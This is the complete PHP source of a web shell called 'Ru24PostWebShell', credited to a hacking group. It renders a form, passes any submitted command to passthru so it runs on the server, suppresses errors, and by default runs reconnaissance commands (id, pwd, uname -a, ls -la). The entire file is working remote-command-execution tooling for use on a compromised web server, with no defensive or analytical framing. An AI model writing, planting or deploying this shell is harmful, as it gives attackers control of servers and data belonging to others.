<?php
/*
Ru24PostWebShell
Writed by DreAmeRz

http://www.ru24-team.net
*/
error_reporting(0);
$function=passthru; // system, exec, cmd
echo "<html>
<head>
<title>Ru24PostWebShell - ".$_POST['cmd']."</title>
<meta http-equiv='pragma' content='no-cache'>
</head><body>";
echo "<form method=post>";
echo "<input type=text name=cmd size=85>";
echo "</form>";
echo "<pre>";
if ((!$_POST['cmd']) || ($_POST['cmd']=="")) { $_POST['cmd']="id;pwd;uname -a;ls -la"; }
echo "".$function($_POST['cmd'])."</pre></body></html>";


?>
